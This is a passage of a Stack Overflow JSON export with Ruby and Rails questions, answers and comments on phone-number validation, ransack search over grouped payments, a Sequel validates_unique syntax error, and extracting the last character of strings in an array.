location.</p>\n\n<p>However, the above should work for ensuring the length of the <code>phonenumber</code> is 11.</p>\n\n<hr>\n\n<p>Update:</p>\n\n<p>The gem has a number of methods for checking validity of phone numbers, such as the following:</p>\n\n<p><code>Phonelib.valid? '123456789'</code></p>\n\n<p><code>Phonelib.valid_for_country? '123456789', 'XX'</code></p>\n\n<p>You also need to configure the gem in <code>config/initializers/phonelib.rb</code> - if you could add that code to your question that would be useful.</p>\n\n<p>However, to make use of this, your test could look something like:</p>\n\n<pre><code>test 'phonenumber should be 11 digits' do\n  @user.phonenumber = 11\n  assert_not Phonelib.valid?(@user.phonenumber)\nend\n</code></pre>\n"}], "owner": {"reputation": 1, "user_id": 8932383, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-NS9k0O-Ra_M/AAAAAAAAAAI/AAAAAAAAAXg/PilkgzzSoYI/photo.jpg?sz=128", "display_name": "Inioluwa Akinleye", "link": "https://stackoverflow.com/users/8932383/inioluwa-akinleye"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 519, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1511963079, "creation_date": 1511962065, "last_edit_date": 1511962988, "question_id": 47553985, "link": "https://stackoverflow.com/questions/47553985/ruby-on-rails-test-for-specific-phone-number-of-digits", "title": "ruby on rails - test for specific phone number of digits", "body": "<p>This is my code</p>\n\n<pre><code>test 'phonenumber should be 11 digits' do\n  @user.phonenumber = 11\n  assert_not @user.valid?\nend\n</code></pre>\n\n<p>this is my model validations, i am using the gem phonelibs</p>\n\n<pre><code>class User &lt; ApplicationRecord\n  before_save { email.downcase! }\n  validates :name, presence: true, length: { maximum: 50 }\n  validates :phonenumber, phone: { possible: true, allow_blank: true }\n\n  VALID_EMAIL_REGEX = /\\A[\\w+\\-.]+@[a-z\\d\\-]+(\\.[a-z\\d\\-]+)*\\.[a-z]+\\z/i\n  validates :email, presence: true, length: { maximum: 256 },\n                    format: { with: VALID_EMAIL_REGEX },\n                    uniqueness: { case_sensitive: false }\n  has_secure_password\n  validates :password, presence: true, length: { minimum: 6 }\nend\n</code></pre>\n\n<p>this already added the validations because it uses the  Google libphonenumber and for Nigeria, it is 11</p>\n\n<pre><code>Phonelib.default_country = 'NG'\n</code></pre>\n\n<p>but it isnt testing for the exact digits of phone number</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "search", "ransack"], "owner": {"reputation": 917, "user_id": 7411621, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/a37fcd6d889200d8721cf58a491e4ee5?s=128&d=identicon&r=PG&f=1", "display_name": "taras", "link": "https://stackoverflow.com/users/7411621/taras"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 121, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1511955261, "creation_date": 1511955261, "question_id": 47551843, "link": "https://stackoverflow.com/questions/47551843/search-in-group-of-records-joined-by-field-using-ransack", "title": "Search in group of records, joined by field, using ransack", "body": "<p>I have <code>User</code> (administration), <code>Seller</code>, <code>Customer</code> and <code>Payment</code> models. When customer buys something, two payment will be created - one from customer to seller and one from seller two system (website takes a percentage of each purchase). Those two payments have identical value in <code>identifier</code> filed, so they are in one \"purchase group\". So each purchase creates separate \"purchase group\" with two payments, grouped together by <code>identifier</code>. Let's look at one \"purchase group\":</p>\n\n<pre><code>#&lt;Payment\n id: \"1\",\n user_id: \"5\",\n amount: 100.0,\n created_at: Fri, 10 Nov 2017 19:33:49 +03 +03:00,\n updated_at: Fri, 10 Nov 2017 19:33:49 +03 +03:00,\n transaction_id: \"18Y123451Y261315X\",\n identifier: \"b7d93d89\"&gt;\n\n#&lt;Payment\n id: \"2\",\n user_id: \"1\",\n amount: 2.0,\n created_at: Fri, 10 Nov 2017 19:34:21 +03 +03:00,\n updated_at: Fri, 10 Nov 2017 19:34:21 +03 +03:00,\n transaction_id: \"0L052241XU999721E\",\n identifier: \"b7d93d89\"&gt;\n</code></pre>\n\n<p>So first <code>Payment</code> goes to seller with <code>user_id: \"5\"</code> and second one to the system (main admin with <code>user_id: \"1\"</code>). And they have identical <code>identifier: \"b7d93d89\"</code>.</p>\n\n<p>Each seller can open special table in his profile, where he could see all received money (all payments with <code>user_id: \"5\"</code>) and he could search by <code>transaction_id</code>, BUT only by his own <code>transaction_id</code>, that stored in payments with <code>user_id: \"5\"</code>.</p>\n\n<p>I need to create ransacker for search by any <code>transaction_id</code> in \"purchase group\", so seller could use <code>transaction_id: \"0L052241XU999721E\"</code> from another payment in the same \"purchase group\" and find his own payment.</p>\n\n<p>For now, I don`t have any ideas. Maybe somebody could help me? Thanks.</p>\n"}, {"tags": ["ruby", "sequel", "padrino"], "comments": [{"owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 0, "creation_date": 1511955479, "post_id": 47551683, "comment_id": 82060336, "body": "<b>Syntax</b> error?! There&#39;s nothing syntactically wrong with <code>validates_unique(:category, [:category, :parent_id])</code>!"}, {"owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 0, "creation_date": 1511955561, "post_id": 47551683, "comment_id": 82060380, "body": "Can you please double check exactly what you wrote? I suspect you didn&#39;t save the file after deleting a trailing comma, or something."}, {"owner": {"reputation": 115, "user_id": 8774732, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/bDtaU.jpg?s=128&g=1", "display_name": "Mlok", "link": "https://stackoverflow.com/users/8774732/mlok"}, "reply_to_user": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 0, "creation_date": 1511955777, "post_id": 47551683, "comment_id": 82060488, "body": "I will make it again. I made it more than once times, I am deploying over git, give me a minute"}, {"owner": {"reputation": 115, "user_id": 8774732, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/bDtaU.jpg?s=128&g=1", "display_name": "Mlok", "link": "https://stackoverflow.com/users/8774732/mlok"}, "reply_to_user": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 0, "creation_date": 1511955892, "post_id": 47551683, "comment_id": 82060545, "body": "/usr/local/lib/ruby/gems/2.4.0/gems/padrino-core-0.14.1.1/li&zwnj;&#8203;b/padrino-core/reloa&zwnj;&#8203;der.rb:96:in <code>require&#39; &#47;usr&#47;local&#47;lib&#47;ruby&#47;gems&#47;2.4.0&#47;gems&#47;padrino-core-0.14.1.1&#47;li&zwnj;&#8203;b&#47;padrino-core&#47;reloa&zwnj;&#8203;der.rb:96:in </code>require&#39;: /www/osadababa.cz/osadababa/app/models/category.rb:37: syntax error, unexpected &#39;,&#39;, expecting &#39;)&#39; (SyntaxError) alidates_unique (:category, [:parent_id, :category])                               ^ \tfrom /usr/local/lib/ruby/gems/2.4.0/gems/padrino-core-0.14.1.1/li&zwnj;&#8203;b/padrino-core/reloa&zwnj;&#8203;der.rb:96:in `block in safe_load&#39;"}, {"owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 0, "creation_date": 1511956317, "post_id": 47551683, "comment_id": 82060787, "body": "Why does it say <code>alidates</code> instead of <code>validates</code>, and also with an extra whitespace? Is that in a different file?"}, {"owner": {"reputation": 115, "user_id": 8774732, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/bDtaU.jpg?s=128&g=1", "display_name": "Mlok", "link": "https://stackoverflow.com/users/8774732/mlok"}, "reply_to_user": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 0, "creation_date": 1511956502, "post_id": 47551683, "comment_id": 82060907, "body": "No it is in the middle of model. I don&#39;t know where is &quot;v&quot; lost, it looks like bad output buffer in terminal, I checked for whitespaces and that is not problem."}, {"owner": {"reputation": 115, "user_id": 8774732, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/bDtaU.jpg?s=128&g=1", "display_name": "Mlok", "link": "https://stackoverflow.com/users/8774732/mlok"}, "reply_to_user": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 0, "creation_date": 1511956605, "post_id": 47551683, "comment_id": 82060989, "body": "when I change it just to validates :category or validates [:category] it works like a charm, but not with the problem I need to solve"}, {"owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 0, "creation_date": 1511956749, "post_id": 47551683, "comment_id": 82061079, "body": "I find this a bit odd how you ned to <i>deploy</i> the application in order to debug it!! Don&#39;t you have it running locally?!"}, {"owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 0, "creation_date": 1511956831, "post_id": 47551683, "comment_id": 82061127, "body": "I&#39;m still at a loss why this is happening, to be honest. There&#39;s clearly no <b>syntax</b> error in that line of code, so something strange must be going on in your deployment process. The bizarre error message, that doesn&#39;t even show the correct code, is a red flag to me."}, {"owner": {"reputation": 115, "user_id": 8774732, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/bDtaU.jpg?s=128&g=1", "display_name": "Mlok", "link": "https://stackoverflow.com/users/8774732/mlok"}, "reply_to_user": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 0, "creation_date": 1511956907, "post_id": 47551683, "comment_id": 82061178, "body": "It is not deployment on production, it is on test, I dont have environment on my macbook, I deploy it on test server with complete environment. If it is finished, it goes to deb package and to test server, then to production, don&#39;t worry."}, {"owner": {"reputation": 115, "user_id": 8774732, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/bDtaU.jpg?s=128&g=1", "display_name": "Mlok", "link": "https://stackoverflow.com/users/8774732/mlok"}, "reply_to_user": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 0, "creation_date": 1511957016, "post_id": 47551683, "comment_id": 82061238, "body": "It is simply git pull on debian machine directory, started with rackup, nothing strange on it, I am using it for all the projects. I copied my directory with rsync a tried on another machine, same error. I am lost too, when I use simple (all category) validation it works, it hates this advanced syntax"}, {"owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 0, "creation_date": 1511957309, "post_id": 47551683, "comment_id": 82061408, "body": "What is &quot;advanced syntax&quot;? Anything involving a pair of brackets?! Maybe you have some strange character encoding issue on the machine."}, {"owner": {"reputation": 115, "user_id": 8774732, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/bDtaU.jpg?s=128&g=1", "display_name": "Mlok", "link": "https://stackoverflow.com/users/8774732/mlok"}, "reply_to_user": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 0, "creation_date": 1511958527, "post_id": 47551683, "comment_id": 82062239, "body": "I thought not just validate simple value but some combination of more parameters with parentheses"}, {"owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 0, "creation_date": 1511963435, "post_id": 47551683, "comment_id": 82065460, "body": "I just played around in the console, and I <i>can</i> reproduce your error if you put a space between the method name and the opening bracket. In your code sample above, you didn&#39;t do that; but the error message does show a space. So once again, I&#39;ll ask: Can you please check that your code is the <b>same</b> as what you wrote above?? No extra spaces?!"}, {"owner": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 0, "creation_date": 1511963541, "post_id": 47551683, "comment_id": 82065534, "body": "<code>validates_unique(:category, [:category, :parent_id])</code> should work fine, and <code>validates_unique :category, [:category, :parent_id]</code> should also work fine, but <code>validates_unique (:category, [:category, :parent_id])</code> does not."}, {"owner": {"reputation": 115, "user_id": 8774732, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/bDtaU.jpg?s=128&g=1", "display_name": "Mlok", "link": "https://stackoverflow.com/users/8774732/mlok"}, "reply_to_user": {"reputation": 22436, "user_id": 1954610, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/27d84db27dd0528916e8cd6954bdd328?s=128&d=identicon&r=PG", "display_name": "Tom Lord", "link": "https://stackoverflow.com/users/1954610/tom-lord"}, "edited": false, "score": 0, "creation_date": 1512031182, "post_id": 47551683, "comment_id": 82095575, "body": "I am stupid, I had a space as You showed me, which I did not see, in repetitive looking, yes it is working now. Thanks a lot and sorry for my blindness."}], "answers": [{"tags": [], "owner": {"reputation": 115, "user_id": 8774732, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/bDtaU.jpg?s=128&g=1", "display_name": "Mlok", "link": "https://stackoverflow.com/users/8774732/mlok"}, "is_accepted": true, "score": 1, "last_activity_date": 1512031290, "creation_date": 1512031290, "answer_id": 47569116, "question_id": 47551683, "link": "https://stackoverflow.com/questions/47551683/sequel-validation-check-whether-name-exists-in-same-subcategory/47569116#47569116", "title": "sequel validation check whether name exists in same subcategory", "body": "<p>In method call cannot be a space between method and parameters. Like this</p>\n\n<pre><code>validates_unique (:category, [:category, :parent_id]) \n</code></pre>\n\n<p>It has to be without space</p>\n\n<pre><code>validates_unique(:category, [:category, :parent_id]) \n</code></pre>\n\n<p>I did not see it, in the repetitive readings. Due to tunnel vision and focusing on different parts. I also enlarge my font in my computer. (I have medical issue, loosing sight on right eye).</p>\n"}], "owner": {"reputation": 115, "user_id": 8774732, "user_type": "registered", "accept_rate": 40, "profile_image": "https://i.stack.imgur.com/bDtaU.jpg?s=128&g=1", "display_name": "Mlok", "link": "https://stackoverflow.com/users/8774732/mlok"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 65, "favorite_count": 0, "accepted_answer_id": 47569116, "answer_count": 1, "score": 1, "last_activity_date": 1512031290, "creation_date": 1511954707, "question_id": 47551683, "link": "https://stackoverflow.com/questions/47551683/sequel-validation-check-whether-name-exists-in-same-subcategory", "title": "sequel validation check whether name exists in same subcategory", "body": "<p>I have an sequel model. I am trying to do validation. I have validation</p>\n\n<pre><code>validates_unique :category\n</code></pre>\n\n<p>which checks if the same name of category is not taken. It is okay, but I added subcategories (tree). So every record has parent_id if it is subcategory.</p>\n\n<p>I would like to check for duplicates on the same level. I mean that you cannot have duplicate name in top level or in same category, but you can have</p>\n\n<pre><code>buildings\ngallery &gt; buildings\nnames\n</code></pre>\n\n<p>I was trying to use the examples from documentation, like this</p>\n\n<pre><code>validates_unique(:category, [:category, :parent_id])\n</code></pre>\n\n<p>to check for combination same parent_id (is number or null) and name. But this makes syntax error </p>\n\n<pre><code>syntax error, unexpected ',', expecting ')'\nalidates_unique (:category, [:parent_id, :category])\n</code></pre>\n\n<p>I tried different combination with parenthesis or without, but with no succes. </p>\n\n<pre><code>validates_unique([:category, :parent_id])\n</code></pre>\n\n<p>Do you have any clue please?</p>\n"}, {"tags": ["ruby"], "comments": [{"owner": {"reputation": 486, "user_id": 1665347, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/33a7f9904f3dc29abba5f7b8fce31aa3?s=128&d=identicon&r=PG", "display_name": "a131", "link": "https://stackoverflow.com/users/1665347/a131"}, "edited": false, "score": 1, "creation_date": 1511954065, "post_id": 47551257, "comment_id": 82059482, "body": "Can you post what u have tried so far?"}, {"owner": {"reputation": 155803, "user_id": 314166, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/zL1re.jpg?s=128&g=1", "display_name": "sawa", "link": "https://stackoverflow.com/users/314166/sawa"}, "edited": false, "score": 1, "creation_date": 1511954230, "post_id": 47551257, "comment_id": 82059605, "body": "What is <code>for.each</code>?"}, {"owner": {"reputation": 9030, "user_id": 5101476, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/JCQrl.jpg?s=128&g=1", "display_name": "ice\u30c4", "link": "https://stackoverflow.com/users/5101476/ice%e3%83%84"}, "edited": false, "score": 0, "creation_date": 1511982261, "post_id": 47551257, "comment_id": 82077561, "body": "You can do <code>down.map { |str| str[&#47;\\d+\\z&#47;] }</code> in case of numbers more than a single-digit. Also variable names should be all lower-case and why is it called down, when it contains strings with all <code>&quot;up&quot;</code>s!?"}], "answers": [{"tags": [], "owner": {"reputation": 9602, "user_id": 3607136, "user_type": "registered", "accept_rate": 84, "profile_image": "https://i.stack.imgur.com/NRFso.jpg?s=128&g=1", "display_name": "Gagan Gami", "link": "https://stackoverflow.com/users/3607136/gagan-gami"}, "is_accepted": false, "score": 3, "last_activity_date": 1511955054, "last_edit_date": 1511955054, "creation_date": 1511954383, "answer_id": 47551572, "question_id": 47551257, "link": "https://stackoverflow.com/questions/47551257/how-to-get-the-last-character-of-a-string-in-an-array/47551572#47551572", "title": "How to get the last character of a string in an array", "body": "<p>your variable name should not start with Capital letter, </p>\n\n<pre><code>&gt; down = [\"up 1\", \"up 2\", \"up 3\"]\n&gt; numbers_ary = down.map{|s|s[-1]}\n#=&gt; [\"1\", \"2\", \"3\"]\n</code></pre>\n\n<p><strong>OR</strong></p>\n\n<pre><code>&gt; numbers_ary = down.map{|s| s.chars.last}\n#=&gt; [\"1\", \"2\", \"3\"]\n</code></pre>\n\n<blockquote>\n  <p>make a conditional statement like for.each based on the result</p>\n</blockquote>\n\n<p>If you make a loop of an array and assign value to same variable <code>@x</code> using any logic, it will be override and assign last value.</p>\n\n<p>But as per your concern of logic, can do this way:</p>\n\n<pre><code>num = numbers_ary.sample #sample is used to pick random element from numbers_ary\ncase num\n  when \"1\", \"2\", \"3\"\n   @x = num.to_i - 1\nend\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 28612, "user_id": 5025116, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7WdYi.jpg?s=128&g=1", "display_name": "Sebastian Palma", "link": "https://stackoverflow.com/users/5025116/sebastian-palma"}, "edited": false, "score": 2, "creation_date": 1511956907, "post_id": 47551590, "comment_id": 82061179, "body": "Did you run this before adding it as an answer?"}, {"owner": {"reputation": 486, "user_id": 1665347, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/33a7f9904f3dc29abba5f7b8fce31aa3?s=128&d=identicon&r=PG", "display_name": "a131", "link": "https://stackoverflow.com/users/1665347/a131"}, "reply_to_user": {"reputation": 28612, "user_id": 5025116, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7WdYi.jpg?s=128&g=1", "display_name": "Sebastian Palma", "link": "https://stackoverflow.com/users/5025116/sebastian-palma"}, "edited": false, "score": 0, "creation_date": 1511958892, "post_id": 47551590, "comment_id": 82062500, "body": "Yes, I did run it. Why are you asking? and whoever down voted this answer. Please let me know why"}, {"owner": {"reputation": 486, "user_id": 1665347, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/33a7f9904f3dc29abba5f7b8fce31aa3?s=128&d=identicon&r=PG", "display_name": "a131", "link": "https://stackoverflow.com/users/1665347/a131"}, "reply_to_user": {"reputation": 28612, "user_id": 5025116, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7WdYi.jpg?s=128&g=1", "display_name": "Sebastian Palma", "link": "https://stackoverflow.com/users/5025116/sebastian-palma"}, "edited": false, "score": 0, "creation_date": 1511959456, "post_id": 47551590, "comment_id": 82062887, "body": "@SebastianPalma please see the output above"}, {"owner": {"reputation": 28612, "user_id": 5025116, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7WdYi.jpg?s=128&g=1", "display_name": "Sebastian Palma", "link": "https://stackoverflow.com/users/5025116/sebastian-palma"}, "edited": false, "score": 0, "creation_date": 1511959954, "post_id": 47551590, "comment_id": 82063190, "body": "I don&#39;t know which Ruby version you&#39;re using, or any other factor that makes the difference. See the <a href=\"https://gist.github.com/vnhnhm/7fb7af2a91d67fc15b8db246fa19719e\" rel=\"nofollow noreferrer\">output</a>, also in the irb using Ruby 2.4.1. Anyways, I&#39;m not a downvoter here."}, {"owner": {"reputation": 486, "user_id": 1665347, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/33a7f9904f3dc29abba5f7b8fce31aa3?s=128&d=identicon&r=PG", "display_name": "a131", "link": "https://stackoverflow.com/users/1665347/a131"}, "reply_to_user": {"reputation": 35276, "user_id": 182590, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/134ea397777886d6f0aa992672a50eaa?s=128&d=identicon&r=PG", "display_name": "Mark Thomas", "link": "https://stackoverflow.com/users/182590/mark-thomas"}, "edited": false, "score": 0, "creation_date": 1511960564, "post_id": 47551590, "comment_id": 82063566, "body": "@MarkThomas, Please see the output. Its doing exactly what I think i.e returning last character of the string. Anyways, I know why it is working for me and not you guys. <code>&gt; String.new.method(:last).source_location =&gt; [&quot;&#47;home&#47;xeon&#47;.rbenv&#47;versions&#47;2.3.4&#47;lib&#47;ruby&#47;gems&#47;2.3.0&#47;gems&#47;&zwnj;&#8203;activesupport-4.2.8&#47;&zwnj;&#8203;lib&#47;active_support&#47;c&zwnj;&#8203;ore_ext&#47;string&#47;acces&zwnj;&#8203;s.rb&quot;, 95]</code>"}, {"owner": {"reputation": 486, "user_id": 1665347, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/33a7f9904f3dc29abba5f7b8fce31aa3?s=128&d=identicon&r=PG", "display_name": "a131", "link": "https://stackoverflow.com/users/1665347/a131"}, "edited": false, "score": 0, "creation_date": 1511960609, "post_id": 47551590, "comment_id": 82063587, "body": "Basically, I copy pasted it to the console I had open which has the <code>active_support</code> library pre loaded."}, {"owner": {"reputation": 35276, "user_id": 182590, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/134ea397777886d6f0aa992672a50eaa?s=128&d=identicon&r=PG", "display_name": "Mark Thomas", "link": "https://stackoverflow.com/users/182590/mark-thomas"}, "edited": false, "score": 0, "creation_date": 1511960657, "post_id": 47551590, "comment_id": 82063616, "body": "So basically your answer has a Rails dependency which you didn&#39;t mention"}, {"owner": {"reputation": 486, "user_id": 1665347, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/33a7f9904f3dc29abba5f7b8fce31aa3?s=128&d=identicon&r=PG", "display_name": "a131", "link": "https://stackoverflow.com/users/1665347/a131"}, "edited": false, "score": 0, "creation_date": 1511960949, "post_id": 47551590, "comment_id": 82063776, "body": "Correct, I will edit my post. Also, does the answer need to be spoon feed. It needs to work when I copy paste it otherwise it is incorrect. Did you guys ever learn to write pseudo code (no offense intended). What about the logic behind the given answer"}, {"owner": {"reputation": 35276, "user_id": 182590, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/134ea397777886d6f0aa992672a50eaa?s=128&d=identicon&r=PG", "display_name": "Mark Thomas", "link": "https://stackoverflow.com/users/182590/mark-thomas"}, "edited": false, "score": 1, "creation_date": 1511961124, "post_id": 47551590, "comment_id": 82063896, "body": "No, the answer shouldn&#39;t be spoon-fed. In my opinion, answers to questions that have absolutely no attempt to solve the problem should consist only of hints, not working solutions."}, {"owner": {"reputation": 486, "user_id": 1665347, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/33a7f9904f3dc29abba5f7b8fce31aa3?s=128&d=identicon&r=PG", "display_name": "a131", "link": "https://stackoverflow.com/users/1665347/a131"}, "reply_to_user": {"reputation": 35276, "user_id": 182590, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/134ea397777886d6f0aa992672a50eaa?s=128&d=identicon&r=PG", "display_name": "Mark Thomas", "link": "https://stackoverflow.com/users/182590/mark-thomas"}, "edited": false, "score": 0, "creation_date": 1511961243, "post_id": 47551590, "comment_id": 82063980, "body": "@MarkThomas +1. Also, edited the answer to include rails dependency and how to remove that dependency"}], "tags": [], "owner": {"reputation": 486, "user_id": 1665347, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/33a7f9904f3dc29abba5f7b8fce31aa3?s=128&d=identicon&r=PG", "display_name": "a131", "link": "https://stackoverflow.com/users/1665347/a131"}, "is_accepted": false, "score": -2, "last_activity_date": 1511963232, "last_edit_date": 1511963232, "creation_date": 1511954453, "answer_id": 47551590, "question_id": 47551257, "link": "https://stackoverflow.com/questions/47551257/how-to-get-the-last-character-of-a-string-in-an-array/47551590#47551590", "title": "How to get the last character of a string in an array", "body": "<p>The answer below has a rails dependency. To remove that dependency, change <code>down.last</code> to <code>down.chars.last</code> or <code>down[-1]</code>    </p>\n\n<pre><code>Down.each do |down|\n  case(down.last)\n  when '1'\n   @x = 0\n  when '2'\n   @x = 1\n  when '3'\n   @x =2\n  end\nend\n</code></pre>\n\n<p><strong>EDIT</strong>: I am adding the output I got after running this on the irb console for the people who are adding comment about me running this before I posted this answer and downvoting this answer without any clear comments.</p>\n\n<pre><code>irb(main):014:0&gt; Down=[\"up 1\", \"up 2\", \"up 3\"]\n=&gt; [\"up 1\", \"up 2\", \"up 3\"]\nirb(main):015:0&gt; Down.each do |down|\nirb(main):016:1* case(down.last)\nirb(main):017:2&gt; when '1'\nirb(main):018:2&gt; @x = 0\nirb(main):019:2&gt; puts \"word: #{down}, last:#{down.last}, x: #{@x}\"\nirb(main):020:2&gt; when '2'\nirb(main):021:2&gt; @x = 1\nirb(main):022:2&gt; puts \"word: #{down}, last:#{down.last}, x: #{@x}\"\nirb(main):023:2&gt; when '3'\nirb(main):024:2&gt; @x = 2\nirb(main):025:2&gt; puts \"word: #{down}, last:#{down.last}, x: #{@x}\"\nirb(main):026:2&gt; end\nirb(main):027:1&gt; end\nword: up 1, last:1, x: 0\nword: up 2, last:2, x: 1\nword: up 3, last:3, x: 2\n=&gt; [\"up 1\", \"up 2\", \"up 3\"]\n</code></pre>\n"}], "owner": {"reputation": 3, "user_id": 8972541, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0a7611fd8aa0f68f1ac13b0792244572?s=128&d=identicon&r=PG&f=1", "display_name": "Dayne Burger", "link": "https://stackoverflow.com/users/8972541/dayne-burger"}, "delete_vote_count": 1, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 586, "favorite_count": 0, "closed_date": 1511985378, "answer_count": 2, "score": -6, "last_activity_date": 1511963232, "creation_date": 1511953383, "last_edit_date": 1511954189, "question_id": 47551257, "link": "https://stackoverflow.com/questions/47551257/how-to-get-the-last-character-of-a-string-in-an-array", "closed_reason": "Needs details or clarity", "title": "How to get the last character of a string in an array", "body": "<p>I am trying to get the last character of strings in an array like this:</p>\n\n<pre><code>Down = [\"up 1\", \"up 2\", \"up 3\"]\n</code></pre>\n\n<p>I want to receive the <code>\"1\"</code>, <code>\"2\"</code>, and <code>\"3\"</code>, and make a conditional statement like <code>for.each</code> based on the result, which would run this logic:</p>\n\n<ul>\n<li>If the final character is <code>\"1\"</code>, let <code>@x</code> = <code>0</code></li>\n<li>If the final character is 